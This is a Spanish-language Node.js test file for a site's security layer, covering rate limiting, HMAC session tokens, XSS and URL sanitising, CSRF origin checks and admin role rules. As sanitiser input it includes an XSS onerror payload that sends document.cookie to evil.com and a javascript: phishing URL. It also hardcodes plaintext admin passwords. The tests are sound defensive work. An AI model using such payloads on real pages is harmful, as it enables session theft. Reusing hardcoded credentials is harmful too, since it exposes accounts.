import test from 'node:test';
import assert from 'node:assert/strict';
import {
  checkRateLimit,
  recordFailedAttempt,
  resetRateLimit,
  getRateLimitStats,
} from '../src/lib/security/rateLimiter.ts';
import {
  verifyUsername,
  verifyPassword,
  createSessionToken,
  verifySessionToken,
} from '../src/lib/security/auth.ts';
import {
  sanitizeHtml,
  sanitizeUrl,
  sanitizePlainText,
} from '../src/lib/security/sanitizer.ts';
import {
  getSiteMetadata,
  updateSiteMetadata,
  getLibraryDocuments,
  addLibraryDocument,
  deleteLibraryDocument,
} from '../src/lib/data/runtimeStore.ts';
import { validateRequestOrigin } from '../src/lib/security/csrf.ts';
import {
  authenticateAdmin,
  updateAdminRole,
  deleteAdmin,
} from '../src/lib/db/database.ts';

test('1. Rate Limiting: Mitigación de Fuerza Bruta y DoS L7 por IP', () => {
  const testIp = '198.51.100.42';
  resetRateLimit(testIp);

  // Inicialmente debe permitir intentos
  const initial = checkRateLimit(testIp);
  assert.equal(initial.allowed, true, 'Debe permitir primer intento');
  assert.equal(initial.remaining, 5, 'Debe iniciar con 5 intentos restantes');

  // Simular 5 intentos fallidos de ataque por fuerza bruta
  for (let i = 0; i < 5; i++) {
    recordFailedAttempt(testIp);
  }

  // El 6to intento debe estar bloqueado
  const blocked = checkRateLimit(testIp);
  assert.equal(blocked.allowed, false, 'Debe bloquear tras superar el límite');
  assert.equal(blocked.remaining, 0, 'No debe quedar ningún intento disponible');
  assert.ok(blocked.retryAfterSec > 0, 'Debe retornar un Retry-After positivo');

  // Otra IP no debe verse afectada (aislamiento de amenazas)
  const safeIp = '203.0.113.99';
  resetRateLimit(safeIp);
  const safeCheck = checkRateLimit(safeIp);
  assert.equal(safeCheck.allowed, true, 'Otra IP no debe verse afectada por el bloqueo');

  // Limpieza
  resetRateLimit(testIp);
  resetRateLimit(safeIp);
});

test('2. Criptografía y Autenticación: Timing Attacks y Firma HMAC-SHA256', () => {
  // Verificación de usuario
  assert.equal(verifyUsername('fireboy'), true, 'Debe reconocer al usuario fireboy');
  assert.equal(verifyUsername('FIREBOY '), true, 'Debe normalizar mayúsculas y espacios');
  assert.equal(verifyUsername('attacker_root'), false, 'Debe rechazar usuarios no autorizados');

  // Verificación de contraseña timingSafeEqual
  assert.equal(verifyPassword('fireboy_bonten_2026'), true, 'Debe validar la clave de administrador');
  assert.equal(verifyPassword('wrong_password_attempt'), false, 'Debe rechazar claves incorrectas');

  // Creación y firma de token de sesión
  const token = createSessionToken('fireboy', 'ROLE_SUPERADMIN');
  assert.ok(typeof token === 'string' && token.includes('.'), 'El token debe tener formato payload.signature');

  // Validación de token íntegro
  const verifyResult = verifySessionToken(token);
  assert.equal(verifyResult.valid, true, 'El token legítimo debe ser válido');
  assert.equal(verifyResult.payload?.username, 'fireboy');
  assert.equal(verifyResult.payload?.role, 'ROLE_SUPERADMIN');

  // Resistencia a manipulación: Falsificación de firma (Tampering)
  const tamperedToken = token.slice(0, -4) + 'abcd';
  const tamperedResult = verifySessionToken(tamperedToken);
  assert.equal(tamperedResult.valid, false, 'Un token manipulado debe ser rechazado');
});

test('3. Prevención de XSS y Manipulación de URLs Maliciosas (OWASP)', () => {
  // Intento de inyección de script malicioso
  const xssPayload = 'Ensayo teológico <script>alert("pwned")</script> con doctrina pura';
  const cleanHtml = sanitizeHtml(xssPayload);
  assert.doesNotMatch(cleanHtml, /<script>/i, 'Debe neutralizar etiquetas <script>');
  assert.doesNotMatch(cleanHtml, /<\/script>/i, 'Debe remover cierre de script');
  assert.ok(cleanHtml.includes('Ensayo teológico'), 'Debe preservar el contenido legítimo');

  // Intento de inyección de manejador de eventos onload/onerror
  const eventPayload = '<img src="/foto.jpg" onerror="fetch(\'http://evil.com/steal?c=\'+document.cookie)" />';
  const cleanEvent = sanitizeHtml(eventPayload);
  assert.doesNotMatch(cleanEvent, /onerror/i, 'Debe eliminar manejadores de eventos');

  // Intento de ataque por pseudoprotocolo javascript:
  const dangerousUrl = 'javascript:document.location="http://phishing.site"';
  const safeUrl = sanitizeUrl(dangerousUrl, '#');
  assert.equal(safeUrl, '#', 'Debe rechazar URLs con javascript:');

  // URLs seguras permitidas
  assert.equal(sanitizeUrl('https://youtube.com/@fireboyphilosophy'), 'https://youtube.com/@fireboyphilosophy');
  assert.equal(sanitizeUrl('/assets/fireboy_client.webp'), '/assets/fireboy_client.webp');
});

test('4. Almacén Dinámico y Control de Metadatos para Fireboy', () => {
  const initialMeta = getSiteMetadata();
  assert.ok(initialMeta.title.includes('BONTEN'), 'Debe contener el título base');
  assert.equal(initialMeta.fireboy.handle, '@fireboyphilosophy', 'Debe contener el handle de Fireboy');

  // Actualización de metadatos con saneamiento
  const updated = updateSiteMetadata({
    headerSlogan: 'BONTEN // NUEVA ERA INTELECTUAL',
    fireboy: {
      ...initialMeta.fireboy,
      bio: 'Líder doctrinal BONTEN, comprometido con la apologética rigurosa.',
      tiktok: 'https://www.tiktok.com/@fireboyphilosophy',
    },
  });

  assert.equal(updated.headerSlogan, 'BONTEN // NUEVA ERA INTELECTUAL');
  assert.ok(updated.fireboy.bio.includes('Líder doctrinal'));

  // Gestión de biblioteca
  const initialDocs = getLibraryDocuments();
  const initialCount = initialDocs.length;

  const newDoc = addLibraryDocument({
    title: 'Apologética Cuántica y la Causa Primera',
    category: 'Filosofía',
    author: 'Fireboy',
    readTime: '7 min',
    image: '/assets/lib_types_1781465379712.webp',
    content: ['Un análisis de la causalidad frente al materialismo determinista.'],
  });

  assert.ok(newDoc.id > 0, 'Debe asignarle un ID incremental');
  assert.equal(getLibraryDocuments().length, initialCount + 1, 'Debe incrementarse el conteo de documentos');

  // Eliminación limpia
  const deleted = deleteLibraryDocument(newDoc.id);
  assert.equal(deleted, true, 'Debe permitir eliminar el documento');
  assert.equal(getLibraryDocuments().length, initialCount, 'Debe volver al conteo original');
});

test('5. Protección Anti-CSRF y Validación de Encabezados Origin/Referer', () => {
  // Petición de lectura (GET) es idempotente y permitida
  const getReq = { method: 'GET', headers: new Headers() };
  assert.equal(validateRequestOrigin(getReq).valid, true);

  // Petición mutante (POST) desde origen no autorizado debe rechazarse
  const foreignPost = {
    method: 'POST',
    headers: new Headers({
      host: 'bonten.vercel.app',
      origin: 'https://evil-phishing-attacker.com',
    }),
  };
  const foreignResult = validateRequestOrigin(foreignPost);
  assert.equal(foreignResult.valid, false, 'Debe rechazar origen foráneo');
  assert.ok(foreignResult.reason.includes('no coincide'));

  // Petición mutante con mismo origen debe permitirse
  const validPost = {
    method: 'POST',
    headers: new Headers({
      host: 'bonten.vercel.app',
      origin: 'https://bonten.vercel.app',
    }),
  };
  assert.equal(validateRequestOrigin(validPost).valid, true, 'Debe autorizar el mismo origen');
});

test('6. Multi-Admin & Gobernanza RBAC: Fireboy como Superadmin Principal y Directiva', () => {
  // 1. Autenticación de Fireboy como ROLE_SUPERADMIN
  const fireboyAuth = authenticateAdmin('fireboy', 'fireboy_bonten_2026');
  assert.equal(fireboyAuth.success, true);
  assert.equal(fireboyAuth.user?.role, 'ROLE_SUPERADMIN');

  // 2. Autenticación de Administrador Secundario (Daniel)
  const danielAuth = authenticateAdmin('daniel', 'daniel_bonten_2026');
  assert.equal(danielAuth.success, true);
  assert.equal(danielAuth.user?.role, 'ROLE_ADMIN');

  // 3. Usuario regular no puede autenticarse como administrador
  const normalUserAuth = authenticateAdmin('estudiante_filo', 'bonten_member_123');
  assert.equal(normalUserAuth.success, false, 'Miembro regular no tiene rol de admin');

  // 4. Inmutabilidad del Superadmin: Nadie puede degradar o eliminar a Fireboy
  const demoteFireboy = updateAdminRole(1, 'ROLE_ADMIN', 'ROLE_SUPERADMIN');
  assert.equal(demoteFireboy.success, false, 'No se debe permitir modificar el rol del Superadmin Principal');

  const deleteFireboy = deleteAdmin(1, 'ROLE_SUPERADMIN');
  assert.equal(deleteFireboy.success, false, 'No se debe permitir eliminar al Superadmin Principal');

  // 5. Prevención de escalada de privilegios: Un ROLE_ADMIN no puede revocar administradores
  const illegalRevoke = deleteAdmin(2, 'ROLE_ADMIN');
  assert.equal(illegalRevoke.success, false, 'Un ROLE_ADMIN no tiene permisos para revocar administradores');
});


